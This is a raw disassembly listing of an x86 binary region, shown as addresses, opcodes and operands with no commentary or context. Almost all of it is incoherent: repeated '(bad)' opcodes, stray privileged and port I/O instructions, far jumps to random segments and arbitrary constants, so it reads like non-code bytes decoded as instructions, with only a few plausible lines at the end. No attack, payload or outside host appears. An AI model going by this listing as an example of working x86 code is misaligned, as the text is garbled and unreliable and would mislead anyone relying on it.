  423c8c:	enter  0x69dd,0x11
  423c90:	lods   eax,DWORD PTR ds:[esi]
  423c91:	sbb    DWORD PTR [edi],ebx
  423c93:	(bad)
  423c96:	clc    
  423c97:	jbe    0x423c4a
  423c99:	shl    BYTE PTR [edi+0x7a],0x91
  423c9d:	je     0x423cf5
  423c9f:	mov    esp,0x7977f377
  423ca4:	push   eax
  423ca5:	mov    es,WORD PTR [esi]
  423ca7:	js     0x423ced
  423ca9:	sti    
  423caa:	xlat   BYTE PTR ds:[ebx]
  423cab:	inc    ecx
  423cac:	pop    ebx
  423cad:	push   esp
  423cae:	js     0x423ccd
  423cb0:	lds    edx,FWORD PTR [esi+0xf]
  423cb3:	inc    edx
  423cb4:	push   es
  423cb5:	inc    ebp
  423cb6:	push   esi
  423cb7:	and    BYTE PTR [esi+edx*2+0x79],al
  423cbb:	mov    ch,0x1c
  423cbd:	dec    ebp
  423cbe:	sahf   
  423cbf:	lock sub dl,al
  423cc2:	jnp    0x423d23
  423cc4:	mov    eax,0xef67a461
  423cc9:	jp     0x423cf3
  423ccb:	jbe    0x423ca6
  423ccd:	xor    eax,0x8fe9ed7b
  423cd2:	pop    edx
  423cd3:	icebp  
  423cd4:	mov    al,ds:0xebdcc9ad
  423cd9:	(bad)  
  423cda:	sahf   
  423cdb:	arpl   WORD PTR [esi],ax
  423cdd:	dec    ebp
  423cde:	inc    ebp
  423cdf:	test   ah,ch
  423ce1:	test   al,0x86
  423ce3:	jb     0x423d63
  423ce5:	sub    ecx,DWORD PTR [ebx+eiz*8+0x499580db]
  423cec:	outs   dx,BYTE PTR ds:[esi]
  423ced:	jb     0x423d30
  423cef:	cdq    
  423cf0:	mov    cl,0xc7
  423cf2:	mov    dl,0x5a
  423cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cf5:	or     BYTE PTR [edx+0x10378e2f],ah
  423cfb:	fxch   st(6)
  423cfd:	mov    edi,0x247c374d
  423d02:	mov    al,0x24
  423d04:	or     bl,BYTE PTR [edx+0x15]
  423d07:	out    dx,al
  423d08:	div    DWORD PTR [eax-0x214497a0]
  423d0e:	and    eax,0xa6c91ec6
  423d13:	or     al,0xb0
  423d15:	sbb    eax,0x1c94ef61
  423d1a:	and    eax,0x4fcad7f2
  423d1f:	jno    0x423cac
  423d21:	stc    
  423d22:	scas   eax,DWORD PTR es:[edi]
  423d23:	fs ror cl,1
  423d26:	pop    es
  423d27:	push   ebp
  423d28:	jl     0x423ce4
  423d2a:	jmp    0x6320:0x81246742
  423d31:	inc    esi
  423d32:	mov    ah,0xf5
  423d34:	xlat   BYTE PTR ds:[ebx]
  423d35:	es js  0x423d7e
  423d38:	cmp    DWORD PTR ss:[esi],edx
  423d3b:	loope  0x423cfb
  423d3d:	fs test dl,cl
  423d40:	sbb    ah,BYTE PTR [edi+ecx*1]
  423d43:	cmc    
  423d44:	jns    0x423d0c
  423d46:	(bad)  
  423d47:	data16 out dx,al
  423d49:	(bad)  
  423d4a:	fisttp WORD PTR [edx-0x3]
  423d4d:	or     ebp,DWORD PTR [esp+ebx*2]
  423d50:	push   0xf7d23daf
  423d55:	or     BYTE PTR [ebx+0x1a],dl
  423d58:	aaa    
  423d59:	dec    esi
  423d5a:	dec    edi
  423d5b:	mov    ch,cl
  423d5d:	aas    
  423d5e:	and    esp,esp
  423d60:	rcr    BYTE PTR [ecx-0x1af3e931],0x3f
  423d67:	cli    
  423d68:	adc    al,0x10
  423d6a:	loope  0x423d8f
  423d6c:	dec    esi
  423d6d:	sub    eax,edi
  423d6f:	add    ah,BYTE PTR [ebp-0x7]
  423d72:	push   ebp
  423d73:	add    ch,BYTE PTR [edi-0x25c8cf91]
  423d79:	jne    0x423d31
  423d7b:	pop    ebx
  423d7c:	fldpi  
  423d7e:	jmp    0xc5e50dcc
  423d83:	mov    dl,0x6b
  423d85:	jle    0x423d56
  423d87:	push   0x3b
  423d89:	push   ecx
  423d8a:	dec    ebx
  423d8b:	cld    
  423d8c:	popf   
  423d8d:	fs inc edi
  423d8f:	in     eax,dx
  423d90:	adc    BYTE PTR [esi-0x5d04ef92],al
  423d96:	sub    ecx,ebp
  423d98:	xor    al,0x31
  423d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d9b:	dec    ebp
  423d9c:	jnp    0xc16e5fd6
  423da2:	loopne 0x423d97
  423da4:	fidiv  DWORD PTR ds:0x630a8f3f
  423daa:	xor    DWORD PTR ds:0x785d2f7a,ebp
  423db0:	pushf  
  423db1:	loop   0x423d48
  423db3:	mov    DWORD PTR [edi],esi
  423db5:	outs   dx,DWORD PTR ds:[esi]
  423db6:	and    edx,esp
  423db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423db9:	mov    cl,0xd3
  423dbb:	jns    0x423d6a
  423dbd:	jmp    0x94863698
  423dc2:	xchg   ebp,eax
  423dc3:	and    ch,BYTE PTR [ebx+eax*1+0x3493cc29]
  423dca:	lods   al,BYTE PTR ds:[esi]
  423dcb:	aaa    
  423dcc:	sub    ecx,DWORD PTR [ecx]
  423dce:	inc    esp
  423dcf:	mov    esp,0x35ab43c3
  423dd4:	imul   esp,esp,0xffffffe4
  423dd7:	mov    edx,0xc6e0dc6a
  423ddc:	out    dx,eax
  423ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423dde:	xchg   BYTE PTR [edi+ebp*4+0x2b6df3cd],bl
  423de5:	call   FWORD PTR [edi-0x29]
  423de8:	jecxz  0x423e31
  423dea:	mov    al,ds:0xa2624013
  423def:	nop
  423df0:	mov    ds:0x546b66fa,eax
  423df5:	int3   
  423df6:	cmp    al,bh
  423df8:	mov    eax,ds:0xc08aafd3
  423dfd:	fwait
  423dfe:	fs addr16 add al,0x84
  423e02:	and    BYTE PTR [esi-0x10],bh
  423e05:	or     BYTE PTR [ebx+0x5f],0x7f
  423e09:	jo     0x423e77
  423e0b:	pop    ecx
  423e0c:	idiv   ebx
  423e0e:	in     eax,dx
  423e0f:	pop    ebp
  423e10:	push   eax
  423e11:	sahf   
  423e12:	(bad)  
  423e13:	leave  
  423e14:	xchg   edi,eax
  423e15:	jns    0x423e14
  423e17:	lock das 
  423e19:	outs   dx,DWORD PTR ds:[esi]
  423e1a:	ds aas 
  423e1c:	call   0x7c02:0x2a02e767
  423e23:	fldenv [ebx+0x71]
  423e26:	int3   
  423e27:	push   0xfffffff8
  423e29:	sbb    ebx,esp
  423e2b:	jmp    0x9b52e8d4
  423e30:	push   ds
  423e31:	in     eax,dx
  423e32:	fwait
  423e33:	inc    edi
  423e34:	les    edx,FWORD PTR [esi]
  423e36:	mov    ss:0xac3b58ee,eax
  423e3c:	sahf   
  423e3d:	pop    ebx
  423e3e:	mov    ch,0x57
  423e40:	aas    
  423e41:	jno    0x423eaa
  423e43:	lds    eax,FWORD PTR [edi+0x3287f1d]
  423e49:	addr16 push ebx
  423e4b:	aas    
  423e4c:	xlat   BYTE PTR ds:[ebx]
  423e4d:	sub    BYTE PTR [esi],dl
  423e4f:	fcomi  st,st(4)
  423e51:	icebp  
  423e52:	fisub  WORD PTR ds:0x35a9bd91
  423e58:	mov    ebp,0xd91ffc62
  423e5d:	cmp    DWORD PTR [edx],esp
  423e5f:	test   al,0x32
  423e61:	cmp    edi,DWORD PTR cs:[edi]
  423e64:	add    BYTE PTR [ebx],dl
  423e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e67:	(bad)  
  423e68:	gs repnz aas 
  423e6b:	cwde   
  423e6c:	lahf   
  423e6d:	frstor [edi+0x56]
  423e70:	out    dx,al
  423e71:	icebp  
  423e72:	mov    bl,0xda
  423e74:	ds push eax
  423e76:	ja     0x423e80
  423e78:	mov    ah,0xa
  423e7a:	fdivp  st(3),st
  423e7c:	push   edx
  423e7d:	lea    eax,[ecx]
  423e7f:	mov    cl,0x2
  423e81:	cwde   
  423e82:	sbb    ebp,DWORD PTR [eax-0x4752571e]
  423e88:	mov    al,0xe6
  423e8a:	pop    ss
  423e8b:	js     0x423ecd
  423e8d:	mov    ebx,0xcbecee9b
  423e92:	ror    esp,0x7b
  423e95:	retf   
  423e96:	add    dh,BYTE PTR [esi]
  423e98:	inc    esp
  423e99:	std    
  423e9a:	xchg   DWORD PTR [edi-0x33],esi
  423e9d:	add    eax,0xd5a3e514
  423ea2:	mov    DWORD PTR ss:[esi],esi
  423ea5:	cmp    al,dl
  423ea7:	dec    ebp
  423ea8:	dec    esi
  423ea9:	sub    dl,BYTE PTR [eax]
  423eab:	pop    edi
  423eac:	scas   eax,DWORD PTR es:[edi]
  423ead:	rcl    ebp,0x94
  423eb0:	xchg   ebx,eax
  423eb1:	aaa    
  423eb2:	mov    eax,ds:0x77d78af
  423eb7:	add    eax,0x18f602df
  423ebc:	mov    edi,DWORD PTR [ecx]
  423ebe:	sbb    BYTE PTR [ebx+0x6108f563],al
  423ec4:	outs   dx,BYTE PTR ds:[esi]
  423ec5:	(bad)  [edx-0x5d]
  423ec8:	sbb    ah,dh
  423eca:	lods   eax,DWORD PTR ds:[esi]
  423ecb:	mov    edx,0x5f9b5ff1
  423ed0:	int3   
  423ed1:	imul   edx,eax,0x5c
  423ed4:	out    0xd4,eax
  423ed6:	and    eax,DWORD PTR [eax-0x25]
  423ed9:	gs cmp al,0xcf
  423edc:	add    eax,ebp
  423ede:	mul    BYTE PTR [eax+eiz*8-0x2d5ed7fc]
  423ee5:	pop    ebp
  423ee6:	addr16 cmp ah,al
  423ee9:	pop    ss
  423eea:	pop    edx
  423eeb:	aad    0x71
  423eed:	adc    ebx,DWORD PTR [edx]
  423eef:	fwait
  423ef0:	iret   
  423ef1:	adc    ecx,DWORD PTR [edx-0x4e]
  423ef4:	lods   al,BYTE PTR ds:[esi]
  423ef5:	fild   DWORD PTR [ebp-0x5a]
  423ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ef9:	cmp    dl,BYTE PTR [eax+0x3b]
  423efc:	sbb    ebx,esp
  423efe:	mov    al,0x1a
  423f00:	jecxz  0x423ef0
  423f02:	adc    al,0xd1
  423f04:	push   cs
  423f05:	lds    ebx,FWORD PTR gs:[edx+0x28]
  423f09:	jmp    0x7cd7:0x90cf938a
  423f10:	retf   0x9bb3
  423f13:	test   eax,0xc8a62c74
  423f18:	xor    eax,0x6b1a9d46
  423f1d:	mov    al,BYTE PTR [esi]
  423f1f:	inc    ebx
  423f20:	add    dl,BYTE PTR [eax-0x4f]
  423f23:	ss jae 0x423ef8
  423f26:	cli    
  423f27:	jnp    0x423f34
  423f29:	shr    DWORD PTR [esi-0x180853cb],cl
  423f2f:	inc    ebp
  423f30:	sub    eax,0x3c86402b
  423f35:	push   esi
  423f36:	arpl   WORD PTR [ebx],si
  423f38:	repz cmp bl,cl
  423f3b:	pop    ds
  423f3c:	lods   eax,DWORD PTR ds:[esi]
  423f3d:	sbb    BYTE PTR [edx+0xc],cl
  423f40:	fdiv   DWORD PTR [ebx-0xf]
  423f43:	mov    es,WORD PTR [edx-0x12cc3085]
  423f49:	clc    
  423f4a:	push   esp
  423f4b:	or     al,0x95
  423f4d:	pop    esi
  423f4e:	and    al,0x32
  423f50:	xor    BYTE PTR [edi-0x35e62267],ch
  423f56:	add    eax,DWORD PTR [ebp+eiz*8+0x3ff22245]
  423f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f5e:	mov    bh,0xda
  423f60:	jl     0x423f71
  423f62:	or     eax,0x98f70fba
  423f67:	jne    0x423f0d
  423f69:	jno    0x423eeb
  423f6b:	or     BYTE PTR [ebx],0x1d
  423f6e:	(bad)  
  423f70:	js     0x423f8f
  423f72:	dec    ebp
  423f73:	outs   dx,DWORD PTR ds:[esi]
  423f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f75:	xchg   edi,eax
  423f76:	xchg   esp,eax
  423f77:	xor    edx,edi
  423f79:	pop    es
  423f7a:	imul   ebx,DWORD PTR [esi-0x58c861c5],0xffffff90
  423f81:	and    ecx,esp
  423f83:	into   
  423f84:	out    0x8e,eax
  423f86:	push   edi
  423f87:	ds loop 0x423f5f
  423f8a:	and    DWORD PTR [ebx+0x3953bc63],esp
  423f90:	sahf   
  423f91:	stos   BYTE PTR es:[edi],al
  423f92:	mov    edi,0xdf0c1367
  423f97:	pop    ss
  423f98:	jbe    0x423fb2
  423f9a:	fld    QWORD PTR [esi-0x68]
  423f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f9e:	mov    ebx,gs
  423fa0:	pop    ss
  423fa1:	adc    edi,DWORD PTR [edi]
  423fa3:	shl    esp,cl
  423fa5:	aaa    
  423fa6:	imul   DWORD PTR [edx-0x7155951e]
  423fac:	xor    BYTE PTR ds:0xd4e641c7,ah
  423fb2:	xchg   ebx,eax
  423fb3:	inc    ebp
  423fb4:	lods   eax,DWORD PTR ds:[esi]
  423fb5:	mov    WORD PTR [edi+0xe],gs
  423fb8:	fcomi  st,st(4)
  423fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fbb:	mov    ds:0x2e76969b,al
  423fc0:	ins    DWORD PTR es:[edi],dx
  423fc1:	clc    
  423fc2:	ror    BYTE PTR [bx+di+0x470b],1
  423fc7:	cmp    esi,DWORD PTR [ebx+0x4e]
  423fca:	cmp    al,0xab
  423fcc:	test   al,0x7a
  423fce:	retf   0x6bc1
  423fd1:	xor    ecx,ebp
  423fd3:	ss (bad) 
  423fd6:	xchg   esp,eax
  423fd7:	sbb    eax,0xd2299efb
  423fdc:	sahf   
  423fdd:	arpl   ax,cx
  423fdf:	add    BYTE PTR [ebp-0x226e6824],cl
  423fe5:	push   cs
  423fe6:	jmp    0x423fe4
  423fe8:	ins    DWORD PTR es:[edi],dx
  423fe9:	rcr    BYTE PTR [eax-0x25],0x8d
  423fed:	outs   dx,DWORD PTR ds:[esi]
  423fee:	ret    
  423fef:	add    BYTE PTR [edx],ch
  423ff1:	or     BYTE PTR [edi+0x41],al
  423ff4:	inc    esp
  423ff5:	push   ss
  423ff6:	dec    ebx
  423ff7:	into   
  423ff8:	cmp    eax,ecx
  423ffa:	repz xchg ebp,eax
  423ffc:	test   eax,0x9ae008df
  424001:	mov    edx,?
  424003:	mov    edx,0x86e4d9d4
  424008:	int    0x68
  42400a:	pusha  
  42400b:	retf   0xc24c
  42400e:	sub    eax,0x671799c2
  424013:	(bad)  
  424014:	jecxz  0x423fa2
  424016:	pop    ss
  424017:	jl     0x424059
  424019:	cmp    DWORD PTR [edx+ecx*4],esp
  42401c:	add    eax,0xb6d1941a
  424021:	or     ebx,DWORD PTR [eax-0x15]
  424024:	mov    ebx,0xa3a9c79f
  424029:	cli    
  42402a:	rol    BYTE PTR [esi],1
  42402c:	je     0x42408e
  42402e:	pop    ecx
  42402f:	pop    esi
  424030:	cdq    
  424031:	jne    0x4240ae
  424033:	les    ebp,FWORD PTR [eax-0x523f943b]
  424039:	mul    BYTE PTR [ebp-0x41]
  42403c:	lahf   
  42403d:	jo     0x424050
  42403f:	adc    BYTE PTR [esi-0x1],al
  424042:	test   BYTE PTR [ebx],bh
  424044:	(bad)  
  424045:	repz stc 
  424047:	adc    eax,0xcb313107
  42404c:	aas    
  42404d:	xchg   DWORD PTR [esi+0x600b828e],eax
  424053:	jl     0x424050
  424055:	ja     0x42403f
  424057:	cmp    eax,0xd3bf8142
  42405c:	and    edx,DWORD PTR [eax+0x23486b4a]
  424062:	mov    ds:0x76628661,eax
  424067:	push   0x39
  424069:	sub    BYTE PTR [eax],bl
  42406b:	icebp  
  42406c:	mov    esi,0x72ce3c27
  424071:	mov    ebx,?
  424073:	enter  0xd2e3,0xeb
  424077:	pcmpgtw mm6,QWORD PTR [ebx+0x31]
  42407b:	scas   al,BYTE PTR es:[edi]
  42407c:	ins    BYTE PTR es:[edi],dx
  42407d:	xor    DWORD PTR [eax],ebx
  42407f:	stc    
  424080:	cdq    
  424081:	sbb    al,0x57
  424083:	mov    ebx,DWORD PTR [esi+ebp*2-0x7695a9cd]
  42408a:	dec    eax
  42408b:	adc    BYTE PTR [edx-0x6d],0x30
  42408f:	in     eax,dx
  424090:	and    DWORD PTR [edi],ebx
  424092:	cld    
  424093:	out    0x8,al
  424095:	xor    al,0xe4
  424097:	pop    ebp
  424098:	fdiv   st(7),st
  42409a:	lods   al,BYTE PTR ds:[esi]
  42409b:	pop    ebx
  42409c:	pop    es
  42409d:	jl     0x42411e
  42409f:	fdiv   QWORD PTR [ebx]
  4240a1:	and    eax,0x2a006449
  4240a6:	adc    eax,ebx
  4240a8:	inc    ebx
  4240a9:	mov    eax,0xf2a76477
  4240ae:	lods   al,BYTE PTR ds:[esi]
  4240af:	loope  0x4240de
  4240b1:	scas   eax,DWORD PTR es:[edi]
  4240b2:	cmp    BYTE PTR [edx+0x64],cl
  4240b5:	jnp    0x42409f
  4240b7:	push   ecx
  4240b8:	push   ds
  4240b9:	sbb    edx,DWORD PTR [ecx+esi*8+0x31b9b6ce]
  4240c0:	mov    edi,0x9beb0872
  4240c5:	fsubr  st(2),st
  4240c7:	jmp    0x6e2a765c
  4240cc:	(bad)  [eax-0x79]
  4240cf:	xchg   edx,eax
  4240d0:	adc    BYTE PTR [eax],bh
  4240d2:	inc    edx
  4240d3:	jmp    0x865360de
  4240d8:	mov    dl,0xf2
  4240da:	mov    DWORD PTR [esi-0x53],ebx
  4240dd:	out    0x6c,al
  4240df:	inc    ecx
  4240e0:	loopne 0x4240ba
  4240e2:	mov    cl,0xcd
  4240e4:	gs dec esp
  4240e6:	out    dx,eax
  4240e7:	xor    dh,0xfb
  4240ea:	mov    ds:0x8b2d9d41,eax
  4240ef:	test   DWORD PTR [edx+0x1017c07d],0xfbece7b9
  4240f9:	mov    edi,0x32d194a6
  4240fe:	dec    esi
  4240ff:	loopne 0x42413e
  424101:	fisub  DWORD PTR [eax-0x49]
  424104:	push   es
  424105:	jmp    0x424162
  424107:	bound  ebp,QWORD PTR [edi]
  424109:	daa    
  42410a:	pop    esp
  42410b:	(bad)  
  42410c:	js     0x42416d
  42410e:	xor    esp,esi
  424110:	pop    eax
  424111:	add    ch,cl
  424113:	jns    0x4240b6
  424115:	es inc eax
  424117:	jo     0x42412e
  424119:	dec    edx
  42411a:	adc    ebx,ebp
  42411c:	lock or DWORD PTR [edi+0x25],edx
  424120:	mov    dh,BYTE PTR [edx+eiz*4]
  424123:	push   esp
  424124:	inc    edi
  424125:	ret    
  424126:	push   es
  424127:	xchg   esp,eax
  424128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424129:	jp     0x424106
  42412b:	test   DWORD PTR [ebx-0x244cae80],edx
  424131:	ret    0x4565
  424134:	mov    ds:0xbbf14a73,al
  424139:	push   edi
  42413a:	adc    al,0xff
  42413c:	mov    ebx,0x49f5bb31
  424141:	push   ecx
  424142:	leave  
  424143:	push   eax
  424144:	pop    ecx
  424145:	stos   DWORD PTR es:[edi],eax
  424146:	xlat   BYTE PTR ds:[ebx]
  424147:	pop    esp
  424149:	out    0xcd,eax
  42414b:	mov    ah,cl
  42414d:	je     0x42417e
  42414f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424150:	std    
  424151:	cdq    
  424152:	mov    bl,0xfe
  424154:	pushf  
  424155:	xor    DWORD PTR [ecx+edi*2-0x27384879],0xffffff8b
  42415d:	add    BYTE PTR ds:0x787464e0,bl
  424163:	sub    DWORD PTR [edi-0x1f7ed5b8],edi
  424169:	ds sub dh,0x78
  42416d:	cdq    
  42416e:	cli    
  42416f:	add    BYTE PTR [ebp-0x52],cl
  424172:	mov    WORD PTR [ecx],?
  424174:	and    bh,BYTE PTR [ecx+0x246e3989]
  42417a:	add    BYTE PTR gs:[ebx],ch
  42417d:	mov    ebx,DWORD PTR [ecx+eax*4+0x75]
  424181:	dec    edi
  424182:	rcr    DWORD PTR [ebp+0x35],0xd5
  424186:	cli    
  424187:	jno    0x424201
  424189:	stos   BYTE PTR es:[edi],al
  42418a:	fdiv   QWORD PTR ds:0x30754eb3
  424190:	cdq    
  424191:	adc    DWORD PTR [ebx],ebp
  424193:	loop   0x4241c4
  424195:	mov    esp,0x6ca3330a
  42419a:	jns    0x424147
  42419c:	enter  0x2b8e,0xe6
  4241a0:	sbb    DWORD PTR [edx+0x3d],eax
  4241a3:	and    DWORD PTR [ebp-0x2df8dfd0],esp
  4241a9:	repnz and DWORD PTR [ecx+0x27],0x171fb8f
  4241b1:	or     ah,BYTE PTR [edi]
  4241b3:	sub    DWORD PTR [eax],esp
  4241b5:	xor    al,0x5e
  4241b7:	cmp    ah,BYTE PTR [ecx]
  4241b9:	cmp    DWORD PTR [edi+0x22],edx
  4241bc:	push   cs
  4241bd:	pop    edx
  4241be:	lods   eax,DWORD PTR ds:[esi]
  4241bf:	add    eax,0xaccb238a
  4241c4:	pop    es
  4241c5:	inc    BYTE PTR [edi+0x4238b597]
  4241cb:	sbb    al,0xd3
  4241cd:	mov    al,ds:0x6b1e9de
  4241d2:	repz and al,bl
  4241d5:	cli    
  4241d6:	jp     0x4241ef
  4241d8:	cmp    ebp,DWORD PTR [ecx]
  4241da:	cld    
  4241db:	xchg   edx,eax
  4241dc:	test   BYTE PTR [ebp+0x6a16a542],dh
  4241e2:	mov    al,0xe
  4241e4:	cwde   
  4241e5:	push   ebp
  4241e6:	fucomp st(3)
  4241e8:	adc    bl,BYTE PTR [eax]
  4241ea:	sbb    al,0xed
  4241ec:	adc    DWORD PTR [edx-0x53],0x16281e38
  4241f3:	bound  ebx,QWORD PTR [ebx+0x6ca0470e]
  4241f9:	adc    al,0xc6
  4241fb:	ret    
  4241fc:	out    0xae,eax
  4241fe:	mov    esi,esp
  424200:	jmp    0x42421c
  424202:	(bad)
  424205:	jmp    0x424229
  424207:	lods   eax,DWORD PTR ds:[esi]
  424208:	pushf  
  424209:	adc    ah,BYTE PTR [esi+0x42ad906e]
  42420f:	adc    BYTE PTR [edx],dh
  424211:	(bad)  
  424212:	fsubr  st(2),st
  424214:	in     eax,dx
  424215:	je     0x4241e1
  424217:	xor    DWORD PTR [ebx],ebx
  424219:	mov    ecx,0x40614976
  42421e:	sub    BYTE PTR [edi],cl
  424220:	cdq    
  424221:	mov    DWORD PTR [edi+0x1a6751f7],edi
  424227:	mov    edi,0xc77c798b
  42422c:	retf   0x8f13
  42422f:	out    0xcc,al
  424231:	xor    al,0xce
  424233:	xchg   esi,eax
  424234:	push   0xa8df55de
  424239:	xlat   BYTE PTR ds:[ebx]
  42423a:	mov    bl,0x9d
  42423c:	pop    ebp
  42423d:	fwait
  42423e:	sti    
  42423f:	pop    eax
  424240:	cmp    DWORD PTR [ebx],eax
  424242:	mov    dl,0x0
  424244:	cdq    
  424245:	mov    ebx,0x911ec3c9
  42424a:	dec    edi
  42424b:	push   esp
  42424c:	dec    ebp
  42424d:	call   0x35609754
  424252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424253:	test   BYTE PTR [edx],0xaa
  424256:	pusha  
  424257:	inc    edx
  424258:	cmp    bh,BYTE PTR [ebp-0x73697254]
  42425e:	inc    edx
  42425f:	jbe    0x424217
  424261:	inc    eax
  424262:	or     al,0x73
  424264:	out    dx,al
  424265:	fiadd  DWORD PTR [edx+0x7544d6de]
  42426b:	xchg   ecx,eax
  42426c:	mov    cl,0xff
  42426e:	xor    BYTE PTR [edi+ebx*1-0x74],ah
  424272:	sbb    ah,BYTE PTR [edi-0x6e]
  424275:	test   al,0xd3
  424277:	cs sub al,0x2b
  42427a:	bound  dx,DWORD PTR [eax+ebp*2]
  42427e:	test   ah,dh
  424280:	and    DWORD PTR [edi],edi
  424282:	sub    bl,0x78
  424285:	pop    ss
  424286:	lods   eax,DWORD PTR ds:[esi]
  424287:	mov    ds:0x9a3b9b59,al
  42428c:	mov    edx,0x340e94e
  424291:	add    edi,ecx
  424293:	sahf   
  424294:	test   BYTE PTR [ebp+0x1dcef4bc],ch
  42429a:	daa    
  42429b:	sub    al,0x8b
  42429d:	rcl    DWORD PTR [ecx+ebp*2-0x72],1
  4242a1:	int3   
  4242a2:	js     0x4242a2
  4242a4:	inc    ebp
  4242a5:	(bad)  
  4242a6:	retf   0x41b3
  4242a9:	loop   0x424268
  4242ab:	sub    ebp,DWORD PTR [esi+0x5ad0ab89]
  4242b1:	inc    eax
  4242b2:	adc    bh,bh
  4242b4:	outs   dx,BYTE PTR ds:[esi]
  4242b5:	enter  0xe3e6,0xf
  4242b9:	cli    
  4242ba:	ret    0x5376
  4242bd:	jno    0x4242d1
  4242bf:	adc    eax,0xc1f4ce3c
  4242c4:	jle    0x4242a1
  4242c6:	pop    ss
  4242c7:	xor    esi,esi
  4242c9:	xchg   BYTE PTR [ecx],ah
  4242cb:	outs   dx,BYTE PTR ds:[esi]
  4242cc:	(bad)
  4242cf:	sub    eax,0xb3ffd6d8
  4242d4:	popa   
  4242d5:	dec    esp
  4242d6:	jecxz  0x42428d
  4242d8:	(bad)  
  4242d9:	mov    bh,0xc2
  4242db:	cmc    
  4242dc:	xor    al,0x2b
  4242de:	mov    dl,BYTE PTR [edx-0x80]
  4242e1:	xor    DWORD PTR [edi-0x69],0x61
  4242e5:	xchg   edi,eax
  4242e6:	push   ebx
  4242e7:	fistp  QWORD PTR cs:[edx-0x684ed840]
  4242ee:	shl    DWORD PTR [edi+0x4e],cl
  4242f1:	sub    ch,BYTE PTR [esi+0x2884d693]
  4242f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242f8:	push   ebp
  4242f9:	sti    
  4242fa:	jb     0x424328
  4242fc:	xor    al,0xfc
  4242fe:	lea    ebp,[edi-0x63]
  424301:	mov    ds:0x5c5210d3,eax
  424306:	mov    al,0x3f
  424308:	adc    esi,edi
  42430a:	(bad)  
  42430b:	(bad)  
  42430c:	imul   edx,edx,0x53
  42430f:	into   
  424310:	jno    0x424373
  424312:	push   edi
  424313:	daa    
  424314:	repnz dec ebp
  424317:	xlat   BYTE PTR ds:[ebx]
  424318:	cld    
  424319:	cmp    ah,BYTE PTR [esi+edi*4+0x4a]
  42431d:	lds    ebp,FWORD PTR [ebp+0x1b]
  424320:	xchg   ecx,eax
  424321:	push   eax
  424322:	fmulp  st(6),st
  424324:	das    
  424325:	xchg   ecx,eax
  424326:	(bad)
  424329:	repnz lods eax,DWORD PTR ds:[esi]
  42432b:	int3   
  42432c:	jl     0x424368
  42432e:	pop    esi
  42432f:	xchg   edi,eax
  424330:	mov    ecx,0xa93184e
  424335:	ins    DWORD PTR es:[edi],dx
  424336:	push   0xffffffe3
  424338:	(bad)  
  424339:	push   ebx
  42433a:	in     al,dx
  42433b:	jae    0x4243b6
  42433d:	dec    ebp
  42433e:	les    edi,FWORD PTR [ebx]
  424340:	pop    eax
  424341:	push   0x2e
  424343:	(bad)  
  424344:	jnp    0x4242c9
  424346:	mov    esp,0x666f39eb
  42434b:	xor    BYTE PTR [ebx],bh
  42434d:	jg     0x424344
  42434f:	or     DWORD PTR [edi],0x66a77313
  424355:	mov    DWORD PTR [esi-0x2c],ecx
  424358:	gs jp  0x4243ab
  42435b:	or     BYTE PTR [ebp+0x261696d5],ch
  424361:	daa    
  424362:	repz mov dl,0xaa
  424365:	(bad)  
  424366:	repz and eax,0x8f9e6b4a
  42436c:	retf   
  42436d:	out    dx,al
  42436e:	leave  
  42436f:	sub    ebp,DWORD PTR [edx]
  424371:	js     0x4243ec
  424373:	aas    
  424374:	adc    cl,dh
  424376:	rcl    ebp,1
  424378:	inc    ebp
  424379:	out    0x5,al
  42437b:	imul   esi,ecx,0x165ec4c8
  424381:	mov    dh,dh
  424383:	popf   
  424384:	pop    ebp
  424385:	shl    BYTE PTR [eax+edi*4],0x8b
  424389:	popf   
  42438a:	mov    eax,ds:0xe8942491
  42438f:	jp     0x42432e
  424391:	inc    eax
  424392:	sbb    BYTE PTR [eax+0x7d2971d8],dl
  424398:	dec    edi
  424399:	or     DWORD PTR [ebp+0x7a],ebp
  42439c:	outs   dx,DWORD PTR ds:[esi]
  42439d:	pop    es
  42439e:	sub    eax,0x8e2868b7
  4243a3:	into   
  4243a4:	sbb    ecx,DWORD PTR [esi+0x66]
  4243a7:	and    DWORD PTR [eax],eax
  4243a9:	sub    dl,BYTE PTR [edi+ebp*2-0x4ed574a]
  4243b0:	test   eax,0xd38edea4
  4243b5:	pop    ebp
  4243b6:	pop    ebp
  4243b7:	dec    edi
  4243b8:	pop    eax
  4243b9:	mov    bl,0xe5
  4243bb:	sub    BYTE PTR [ecx-0x85b473b],ah
  4243c1:	stc    
  4243c2:	jns    0x424357
  4243c4:	sahf   
  4243c5:	jae    0x424386
  4243c7:	(bad)  
  4243c8:	(bad)  
  4243c9:	or     eax,0x6ec1175a
  4243ce:	stos   DWORD PTR es:[edi],eax
  4243cf:	stos   BYTE PTR es:[edi],al
  4243d0:	push   ecx
  4243d1:	lds    ebp,FWORD PTR [ebx+ebp*2+0x2689332c]
  4243d8:	pop    es
  4243d9:	stos   BYTE PTR es:[edi],al
  4243da:	out    0x60,al
  4243dc:	mov    ebp,0x7358113e
  4243e1:	push   cs
  4243e2:	or     edi,eax
  4243e4:	(bad)  
  4243e5:	fcom   st(0)
  4243e7:	mov    al,BYTE PTR [ebp+0x4e4c8f93]
  4243ed:	mul    bh
  4243ef:	mov    ecx,0xb17524b9
  4243f4:	leave  
  4243f5:	dec    esp
  4243f6:	or     DWORD PTR [ebp+0x52],esp
  4243f9:	cmp    DWORD PTR ds:0x6a4c62b6,ecx
  4243ff:	add    BYTE PTR [edx+0x0],ch
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
